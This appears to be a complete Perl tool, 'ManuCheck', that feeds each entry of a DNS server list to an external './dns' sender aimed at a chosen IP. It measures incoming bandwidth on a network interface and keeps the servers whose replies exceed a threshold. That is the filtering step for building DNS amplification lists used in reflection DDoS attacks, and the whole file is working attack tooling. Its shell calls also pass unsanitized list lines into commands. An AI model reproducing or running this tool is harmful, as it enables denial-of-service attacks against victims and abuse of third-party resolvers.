
#!/usr/bin/perl
my $serverip  = $ARGV[0];
my $interface = $ARGV[1];
my $iplist    = $ARGV[2];
my $maxdata   = $ARGV[3];
my $dnsscript = "dns";
my $filename  = $ARGV[4];

use vars qw( $PROG );
( $PROG = $0 ) =~ s/^.*[\/\\]//;

if ( @ARGV == 0 ) {
    print
"[!] Usage: ./$PROG [YOUR-SERVER-IP] [INTERFACE] [LIST-TO-CHECK] [MAX-DATA] [OUTPUT]\n[!] Example: ./$PROG 1.3.3.7 eth0 dns.txt 1000 output.txt\n[!] Max-Data is Measured in Kbp/s\n[!] Made by Vypor\n[!] http://pastebin.com/u/Autism\nVersion: v0.0.1\n";
    exit;
}

open my $handle, '<', $iplist;
chomp( my @servers = <$handle> );
close $handle;

print "Starting ManuCheck v0.0.1\n";
print "		Current Settings:\n";
print "		IP: $serverip\n";
print "		Interface: $interface\n";
print "		List: $iplist\n";
print "		Max Data: $maxdata\n";
print "		Saving to List: $filename\n";
print "Started...\n\n";

for my $ips (@servers) {

    system("rm -rf .tmp131");
    system("echo $ips >> .tmp131");
    system("./$dnsscript $serverip 80 .tmp131 1 2 > /dev/null &");
    sleep 1;
    my $rx = `cat /sys/class/net/$interface/statistics/rx_bytes`;
    my $tx = `cat /sys/class/net/$interface/statistics/tx_bytes`;
    sleep 1;
    my $rx1 = `cat /sys/class/net/$interface/statistics/rx_bytes`;
    my $tx1 = `cat /sys/class/net/$interface/statistics/tx_bytes`;

    my $rb   = $rx1 - $rx;
    my $kbs  = $rb / 1024;
    my $data = sprintf "%0.f", $kbs;
    if ( $data > $maxdata ) {
        my ( $ip, $domain, $null ) = split( / /, $ips, 3 );
        open( FILE, ">>$filename" );
        print "[+] $ip $domain Responded With $data Saving To list!\n";
        print FILE "$ip $domain\n";
        close(FILE);
    }
    else {
        print "[-] Nope Not Enough Data.\n";
    }
    sleep 2.5;
}
